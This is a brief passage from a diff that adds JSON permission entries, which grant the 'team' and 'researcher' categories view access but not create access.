+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
